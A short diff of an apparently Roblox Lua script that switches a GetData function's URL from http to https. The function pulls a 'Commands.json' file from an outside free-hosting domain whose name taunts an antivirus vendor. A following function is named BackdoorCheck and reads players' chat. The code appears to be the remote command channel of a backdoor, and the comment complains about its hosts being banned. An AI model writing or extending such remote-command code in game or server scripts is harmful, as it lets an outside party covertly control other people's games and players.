@@ -577,7 +577,7 @@ end
 -- [[ Local functions ]] --
 
 local function GetData()
-	return HttpService:JSONDecode(game:HttpGet("http://fuckmalwarebytes2.000webhostapp.com/Commands.json")) -- can I stop getting banned off of web servers 
+	return HttpService:JSONDecode(game:HttpGet("https://fuckmalwarebytes2.000webhostapp.com/Commands.json")) -- can I stop getting banned off of web servers 
 end
 	
 local function BackdoorCheck(Player,Chat)
